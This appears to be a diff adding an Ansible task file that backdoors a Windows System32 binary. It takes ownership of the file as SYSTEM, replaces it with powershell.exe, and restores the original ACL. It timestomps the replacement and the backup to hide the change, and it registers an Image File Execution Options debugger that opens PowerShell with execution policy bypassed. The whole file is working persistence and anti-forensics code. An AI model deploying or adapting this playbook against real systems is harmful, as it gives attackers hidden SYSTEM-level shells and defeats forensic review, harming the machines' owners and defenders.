@@ -1,0 +1,83 @@
+- name: "Get original file stats for {{ target }}"
+  ansible.windows.win_stat:
+    path: "C:\\Windows\\System32\\{{ target }}"
+  register: file_info
+
+- name: "Backdoor File Replacement for {{ target }} - Takeown"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
+    {% raw %}
+    #$Acl = Get-Acl $targetPath
+    (Get-Acl $targetPath).Sddl
+    takeown /f $targetPath
+    icacls $targetPath /grant administrators:F{% endraw %}
+  register: original_sddl
+  become: yes
+  become_method: runas
+  become_user: System
+    
+- name: "Backdoor File Replacement for {{ target }} - Backup"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
+    $backupPath = $targetPath + ".outdated"
+    if (-not (Test-Path $backupPath)) {
+        Move-Item $targetPath $backupPath -Force
+    }
+  become: yes
+  become_method: runas
+  become_user: System
+
+- name: "Backdoor File Replacement for {{ target }} - Replace"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
+    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $targetPath -Force
+    $sddl = "{{ original_sddl.stdout_lines | last | trim }}"
+    $Acl = New-Object System.Security.AccessControl.FileSecurity
+    $Acl.SetSecurityDescriptorSddlForm($sddl)
+    Set-Acl -Path $targetPath -AclObject $Acl
+    #Set-Acl $targetPath $Acl
+  become: yes
+  become_method: runas
+  become_user: System
+
+- name: "Backdoor File Replacement for {{ target }} - Timestomp"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
+    $backupPath = $targetPath + ".outdated"
+
+    # Define the timestamps from Ansible
+    $cTimeUnix = {{ file_info.stat.creationtime }}
+    $mTimeUnix = {{ file_info.stat.lastwritetime }}
+    $aTimeUnix = {{ file_info.stat.lastaccesstime }}
+
+    # Function to convert Unix to DateTime
+    function Convert-UnixToDate($unix) {
+        return [DateTimeOffset]::FromUnixTimeSeconds([int]$unix).DateTime
+    }
+
+    $cDate = Convert-UnixToDate $cTimeUnix
+    $mDate = Convert-UnixToDate $mTimeUnix
+    $aDate = Convert-UnixToDate $aTimeUnix
+
+    # Apply to Target
+    (Get-Item $targetPath).CreationTime = $cDate
+    (Get-Item $targetPath).LastWriteTime = $mDate
+    (Get-Item $targetPath).LastAccessTime = $aDate
+
+    # Apply to Backup
+    if (Test-Path $backupPath) {
+        (Get-Item $backupPath).CreationTime = $cDate
+        (Get-Item $backupPath).LastWriteTime = $mDate
+        (Get-Item $backupPath).LastAccessTime = $aDate
+    }
+  become: yes
+  become_method: runas
+  become_user: System
+  ignore_errors: true # may be in use
+
+- name: "Apply IFEO Registry Redundancy for {{ target }}"
+  ansible.windows.win_regedit:
+    path: "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{ target }}"
+    name: Debugger
+    data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit'
+    state: present
